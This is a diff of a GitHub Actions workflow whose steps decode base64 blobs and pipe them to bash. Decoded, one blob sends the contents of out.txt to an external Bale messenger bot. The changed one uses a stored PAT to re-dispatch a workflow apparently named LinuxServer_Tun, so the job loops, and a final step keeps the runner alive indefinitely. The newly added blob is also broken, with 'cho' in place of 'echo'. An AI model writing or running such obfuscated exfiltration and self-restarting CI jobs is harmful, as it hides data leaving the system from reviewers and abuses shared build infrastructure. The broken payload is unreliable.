@@ -37,11 +37,11 @@ jobs:
         run: |
           echo "VEVYVD0kKGNhdCAuL291dC50eHQgfCBzZWQgJ3MvIi9cXCIvZycgfCB0ciAtZCAnXHInKQoKQ1VSUkVOVF9USU1FPSQoZGF0ZSAiKyVZLyVtLyVkICVIOiVNOiVTIikKCmN1cmwgLVggUE9TVCAiaHR0cHM6Ly90YXBpLmJhbGUuYWkvJHtUT0tFTn0vc2VuZE1lc3NhZ2UiIFwKICAtSCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uIiBcCiAgLWQgJ3sKICAgICJjaGF0X2lkIjogIiciJHtDSEFUX0lEfSInIiwKICAgICJ0ZXh0IjogIiciJHtVU0VSX05BTUV9IidcbiciJHtURVhUfSInXG5cbvCflZIgJyIke0NVUlJFTlRfVElNRX0iJyIKICB9Jwo=" | base64 -d | bash
 
-      - name: Delay and Self-Restart (5 hours 25 minutes)
+      - name: Delay and Self-Restart (5 minutes)
         env:
           PAT: ${{ secrets.PAT_WORKFLOW }}
-        run: |
-          echo "ZWNobyAi8J+VkiBTdGFydGluZyBkZWxheSB0aW1lcjogNSBob3VycyBhbmQgMjUgbWludXRlcy4uLiIKZWNobyAiIEN1cnJlbnQgdGltZTogJChkYXRlKSIKc2xlZXAgNjAwCmVjaG8gIvCfmoAgVHJpZ2dlcmluZyB3b3JrZmxvdyByZXN0YXJ0Li4uIgpjdXJsIC1YIFBPU1QgXAogIC1IICJBY2NlcHQ6IGFwcGxpY2F0aW9uL3ZuZC5naXRodWIudjMranNvbiIgXAogIC1IICJBdXRob3JpemF0aW9uOiB0b2tlbiAkUEFUIiBcCiAgaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy8ke3sgZ2l0aHViLnJlcG9zaXRvcnkgfX0vYWN0aW9ucy93b3JrZmxvd3MvTGludXhTZXJ2ZXJfVHVuLnltbC9kaXNwYXRjaGVzIFwKICAtZCAneyJyZWYiOiJtYWluIn0nCmVjaG8gIuKchSBSZXN0YXJ0IGNvbW1hbmQgc2VudCBzdWNjZXNzZnVsbHkgYXQgJChkYXRlKSIK" | base64 -d | bash
+          REPO: ${{ github.repository }}
+        run: echo "ZWNobyAi8J+VkiBTdGFydGluZyBkZWxheSB0aW1lcjogNSBtaW51dGVzLi4uIgpjaG8gIiBDdXJyZW50IHRpbWU6ICQoZGF0ZSkiCnNsZWVwIDMwMApjaG8gIvCfmoAgVHJpZ2dlcmluZyB3b3JrZmxvdyByZXN0YXJ0Li4uIgpjdXJsIC1YIFBPU1QgXAogIC1IICJBY2NlcHQ6IGFwcGxpY2F0aW9uL3ZuZC5naXRodWIudjMranNvbiIgXAogIC1IICJBdXRob3JpemF0aW9uOiB0b2tlbiAkUEFUIiBcCiAgaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy8kUkVQTy9hY3Rpb25zL3dvcmtmbG93cy9MaW51eFNlcnZlcl9UdW4ueW1sL2Rpc3BhdGNoZXMgXAogIC1kICd7InJlZiI6Im1haW4ifScKZWNobyAi4pyBIFJlc3RhcnQgY29tbWFuZCBzZW50IHN1Y2Nlc3NmdWxseSBhdCAkKGRhdGUpIgo=" | base64 -d | bash
           
       - name: Keep alive
         run: tail -f /dev/null
